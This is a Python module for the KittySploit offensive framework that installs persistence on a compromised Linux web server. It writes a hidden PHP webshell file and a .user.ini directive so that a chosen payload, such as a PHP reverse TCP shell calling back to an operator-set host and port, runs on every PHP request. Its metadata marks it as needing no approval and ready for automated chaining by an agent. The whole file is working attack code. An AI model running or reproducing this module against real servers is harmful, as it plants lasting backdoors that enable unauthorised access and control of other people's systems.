#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.post.linux.persistence_helpers import LinuxPersistenceMixin, PERSISTENCE_AGENT


class Module(Post, LinuxPersistenceMixin):
    __info__ = {
        "name": "PHP user.ini Persistence",
        "description": (
            "Deploys a PHP webshell via .user.ini auto_prepend_file / auto_append_file. "
            "Works with PHP-FPM and Apache when user_ini is enabled."
        ),
        "author": "KittySploit Team",
        "platform": Platform.LINUX,
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
        "tags": ["persistence", "php", "user.ini", "web"],
        "references": ["https://attack.mitre.org/techniques/T1505/003/"],
    'agent': {
        'risk': '',
        'effects': [],
        'expected_requests': 1,
        'reversible': True,
        'approval_required': False,
        'produces': [],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': ['shell'],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'root', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    web_dir = OptString("/var/www/html", "Web directory containing or receiving .user.ini", True)
    prepend_file = OptString(".ks-prepend.php", "PHP file referenced by user.ini (relative to web_dir)", False)
    ini_mode = OptChoice(
        "prepend",
        "user.ini directive: auto_prepend_file or auto_append_file",
        False,
        choices=["prepend", "append"],
    )
    payload_path = OptString("", "Payload module (e.g. payloads/singles/cmd/php/reverse_tcp)", True)
    target = OptChoice("PHP", "Payload embedding", True, choices=["PHP", "Linux command"])
    lhost = OptString("", "Local host for reverse payloads", False)
    lport = OptPort(4444, "Local port for reverse payloads", False)

    def _user_ini_path(self) -> str:
        base = self._opt(self.web_dir).rstrip("/")
        return f"{base}/.user.ini"

    def _php_path(self) -> str:
        base = self._opt(self.web_dir).rstrip("/")
        name = self._opt(self.prepend_file).lstrip("/") or ".ks-prepend.php"
        return f"{base}/{name}"

    def check(self):
        web = self._opt(self.web_dir)
        if not web:
            print_error("web_dir is required")
            return False
        if not self._writable_target(self._user_ini_path(), web):
            print_error(f"Cannot write .user.ini under {web}")
            return False
        print_success("Target directory appears writable for .user.ini persistence")
        return True

    def run(self):

        if not self.linux_require_linux():
            return False

        if not self.check():
            return False

        encoded = self._generate_payload()
        php_path = self._php_path()
        ini_path = self._user_ini_path()
        directive = "auto_prepend_file" if self._opt(self.ini_mode) == "prepend" else "auto_append_file"

        self._maybe_backup(ini_path, "user_ini")
        self._maybe_backup(php_path, "user_ini_php")

        ini_content = (
            f"{directive} = \"{php_path}\"\n"
            "user_ini.filename = \".user.ini\"\n"
            "user_ini.cache_ttl = 5\n"
        )

        print_status(f"Writing PHP shell to {php_path}")
        if not self._write_remote_file(php_path, self._php_file_content(encoded), mode="0644"):
            raise ProcedureError(FailureType.PayloadFailed, f"Cannot write {php_path}")

        print_status(f"Writing {ini_path}")
        if not self._write_remote_file(ini_path, ini_content, mode="0644"):
            raise ProcedureError(FailureType.PayloadFailed, f"Cannot write {ini_path}")

        print_good("PHP user.ini persistence installed.")
        print_status("Triggered on any PHP request in this directory tree (per PHP user_ini rules).")
        return True
